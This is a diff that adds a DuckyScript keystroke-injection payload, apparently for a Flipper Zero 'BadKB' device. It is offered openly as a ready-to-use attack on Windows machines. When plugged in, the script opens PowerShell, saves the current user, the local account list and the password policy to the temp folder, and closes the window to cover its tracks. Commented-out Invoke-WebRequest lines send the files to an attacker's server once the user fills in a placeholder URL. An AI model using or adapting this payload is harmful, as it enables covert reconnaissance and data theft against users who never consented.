@@ -1,0 +1,37 @@
+REM Title: Windows Local User Enum
+REM Author: SAWN
+REM Target: 11. Tested on xtreme FW
+REM Version: 1.0
+REM Simple AD enum for BadKb. Stores all the data in the %temp% folder
+GUI r
+DELAY 500
+STRING powershell
+ENTER
+DELAY 1000
+STRING cd $env:temp
+ENTER
+STRING WHOAMI > user.txt
+ENTER
+DELAY 500
+REM Get local users details
+STRING net user > users.txt
+ENTER
+DELAY 500
+REM enumerate the password policy
+STRING net accounts > PasswdPolicy.txt
+ENTER
+DELAY 500
+REM Uncomment the below code block and update the URL to send the extracted files to your server
+REM STRING powershell Invoke-WebRequest -Uri <YOUR_URL_HERE> -Method POST -InFile
+REM ENTER
+REM DELAY 500
+REM Uncomment the Below code block to get a ping from the machine to your local server
+REM STRING Invoke-WebRequest -Uri <YOUR_URL_HERE> -Method GET;exit
+REM ENTER
+REM DELAY 500
+REM Close Open Prompt
+HOLD ALT
+SPACE
+RELEASE ALT
+STRING C
+ENTER
